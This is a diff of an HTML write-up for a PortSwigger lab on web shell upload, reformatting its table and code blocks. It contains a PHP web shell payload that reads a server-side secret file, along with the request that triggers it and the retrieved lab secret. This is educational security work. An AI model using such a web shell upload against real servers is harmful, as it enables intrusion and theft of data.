@@ -118,9 +118,8 @@
 <div class='table-wrap'><table>
   <tr><th>Field</th><th>Value</th></tr>
   <tr><td><strong>Type</strong></td><td>Web App</td></tr>
-  <tr><td><strong>Target</strong></td><td>PortSwigger Web Security Academy</td></tr>
   <tr><td><strong>Severity</strong></td><td>🔴 High</td></tr>
-  <tr><td><strong>CVE / CWE</strong></td><td>CWE-434: Unrestricted Upload of File with Dangerous Type</td></tr>
+  <tr><td><strong>CVE / CWE</strong></td><td>CWE-434</td></tr>
   <tr><td><strong>Date</strong></td><td>2026-05-13</td></tr>
 </table></div>
 <hr>
@@ -164,18 +163,14 @@
 </blockquote>
 <hr>
 <p><strong>Step 4 — Crafting and uploading the PHP web shell</strong></p>
-<p>Using a terminal in the <code>/port_swigger/file_upload</code> directory, the PHP web shell file <code>exploit.php</code> was created with the following payload:</p>
-<pre><code class="language-javascript">&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</code></pre>
-<p>The file was then uploaded via the avatar upload form. The server accepted it without any file type or extension validation and responded with: <code>The file avatars/exploit.php has been uploaded.</code> Burp Suite confirmed the POST request to <code>/my-account/avatar</code> returned HTTP 200 OK.</p>
+<p>Using a terminal in the <code>/port_swigger/file_upload</code> directory, the PHP web shell file <code>exploit.php</code> was created with the payload <code>&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</code>. The file was then uploaded via the avatar upload form. The server accepted it without any file type or extension validation and responded with: <code>The file avatars/exploit.php has been uploaded.</code> Burp Suite confirmed the POST request to <code>/my-account/avatar</code> returned HTTP 200 OK.</p>
 <blockquote>  <figure><img src="images/lab-1-remote-code-execution-via-web-shell-upload/35fb75237172807d94c0eac9bc6515a7.png" alt="screenshot" loading="lazy"></figure>
   <figure><img src="images/lab-1-remote-code-execution-via-web-shell-upload/35fb752371728012ba55efa6f642e3bd.png" alt="screenshot" loading="lazy"></figure>
   <figure><img src="images/lab-1-remote-code-execution-via-web-shell-upload/35fb75237172803fb12cc32c1d45650d.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
 <hr>
 <p><strong>Step 5 — Triggering the web shell and retrieving the secret</strong></p>
-<p>Sent a GET request directly to <code>/files/avatars/exploit.php?cmd=cat+/home/carlos/secret</code>. The server executed the PHP file and returned the secret:</p>
-<pre><code class="language-javascript">edm25PakrRS04MID1gjwp2GV4ItcUstHP</code></pre>
-<p>The secret was submitted via the lab banner to confirm the lab was solved.</p>
+<p>Sent a GET request directly to <code>/files/avatars/exploit.php?cmd=cat+/home/carlos/secret</code>. The server executed the PHP file and returned the secret: <strong><code>edm25PakrRS04MID1gjwp2GV4ItcUstHP</code></strong>. The secret was submitted via the lab banner to confirm the lab was solved.</p>
 <blockquote>  <figure><img src="images/lab-1-remote-code-execution-via-web-shell-upload/35fb75237172802d94ccd200f5737ec6.png" alt="screenshot" loading="lazy"></figure>
   <figure><img src="images/lab-1-remote-code-execution-via-web-shell-upload/35fb7523717280b28629d04bc7ece6bf.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
@@ -189,6 +184,7 @@
   <li><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload" target="_blank" rel="noopener">PortSwigger Lab: Remote code execution via web shell upload</a></li>
   <li><a href="https://cwe.mitre.org/data/definitions/434.html" target="_blank" rel="noopener">CWE-434: Unrestricted Upload of File with Dangerous Type</a></li>
 </ul>
+<hr>
 
 </div>
 
